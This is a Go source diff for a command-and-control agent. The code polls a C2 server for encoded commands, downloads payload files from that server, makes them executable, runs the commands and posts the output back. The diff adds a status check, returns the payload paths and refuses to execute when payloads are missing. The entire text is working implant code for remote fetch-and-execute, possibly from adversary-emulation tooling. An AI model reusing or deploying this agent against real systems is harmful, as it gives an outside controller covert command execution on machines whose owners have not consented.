@@ -19,7 +19,8 @@ import (
 
 const (
 	// TIMEOUT in seconds represents how long a single command should run before timing out
-	TIMEOUT = 50
+	TIMEOUT = 60
+	OK = 200
 )
 
 // Instructions is a single call to the C2
@@ -42,7 +43,7 @@ func Instructions(profile map[string]interface{}) map[string]interface{} {
 }
 
 // Drop the payload
-func Drop(server string, payload string) {
+func Drop(server string, payload string) string {
 	location := filepath.Join(payload)
 	if len(payload) > 0 && util.Exists(location) == false {
 		fmt.Println(fmt.Sprintf("[*] Downloading new payload: %s", payload))
@@ -52,38 +53,42 @@ func Drop(server string, payload string) {
 		req.Header.Set("platform", string(runtime.GOOS))
 		client := &http.Client{}
 		resp, err := client.Do(req)
-		if err == nil {
-			dst, _ := os.Create(location)
-			defer dst.Close()
-			_, _ = io.Copy(dst, resp.Body)
-			os.Chmod(location, 0500)
+		if err == nil && resp.StatusCode == OK {
+			writePayload(location, resp)
 		}
 	}
+	return location
 }
 
 // Execute executes a command and posts results
-func Execute(profile map[string]interface{}, command map[string]interface{}) {
+func Execute(profile map[string]interface{}, command map[string]interface{}, payloads []string) {
 	timeoutChan := make(chan bool, 1)
 	resultChan := make(chan map[string]interface{}, 1)
 	cmd := string(util.Decode(command["command"].(string)))
 	status := "0"
 	var result []byte
-	go util.TimeoutWatchdog(timeoutChan, TIMEOUT)
-	go execute.Execute(cmd, command["executor"].(string), profile["platform"].(string), resultChan)
-ExecutionLoop:
-	for {
-		select {
-		case data := <-resultChan:
-			result = reflect.ValueOf(data["result"]).Bytes()
-			if reflect.ValueOf(data["err"]).IsValid() {
-				status = "1"
+	missingPaths := checkPayloadsAvailable(payloads)
+	if len(missingPaths) == 0 {
+		go util.TimeoutWatchdog(timeoutChan, TIMEOUT)
+		go execute.Execute(cmd, command["executor"].(string), profile["platform"].(string), resultChan)
+	ExecutionLoop:
+		for {
+			select {
+			case data := <-resultChan:
+				result = reflect.ValueOf(data["result"]).Bytes()
+				if reflect.ValueOf(data["err"]).IsValid() {
+					status = "1"
+				}
+				break ExecutionLoop
+			case <-timeoutChan:
+				result = []byte("Command execution timed out.")
+				status = "124"
+				break ExecutionLoop
 			}
-			break ExecutionLoop
-		case <-timeoutChan:
-			result = []byte("Command execution timed out.")
-			status = "124"
-			break ExecutionLoop
 		}
+	} else {
+		status = "1"
+		result = []byte(fmt.Sprintf("Payload(s) not available: %s", strings.Join(missingPaths, ", ")))
 	}
 	sendExecutionResults(command["id"], profile["server"], result, status, cmd)
 }
@@ -92,12 +97,13 @@ ExecutionLoop:
 func ExecuteInstruction(command map[string]interface{}, profile map[string]interface{}) {
 	fmt.Printf("[*] Running instruction %.0f\n", command["id"])
 	payloads := strings.Split(strings.Replace(command["payload"].(string), " ", "", -1), ",")
+	var droppedPayloads []string
 	for _, payload := range payloads {
 		if len(payload) > 0 {
-			Drop(profile["server"].(string), payload)
+			droppedPayloads = append(droppedPayloads, Drop(profile["server"].(string), payload))
 		}
 	}
-	Execute(profile, command)
+	Execute(profile, command, droppedPayloads)
 }
 
 func sendExecutionResults(command_id interface{}, server interface{}, result []byte, status string, cmd string) {
@@ -120,4 +126,21 @@ func request(address string, data []byte) []byte {
 	}
 	body, _ := ioutil.ReadAll(resp.Body)
 	return util.Decode(string(body))
+}
+
+func writePayload(location string, resp *http.Response) {
+	dst, _ := os.Create(location)
+	defer dst.Close()
+	_, _ = io.Copy(dst, resp.Body)
+	os.Chmod(location, 0500)
+}
+
+func checkPayloadsAvailable(payloads []string) []string {
+	var missing []string
+	for i := range payloads {
+		if util.Exists(filepath.Join(payloads[i])) == false {
+			missing = append(missing, payloads[i])
+		}
+	}
+	return missing
 }
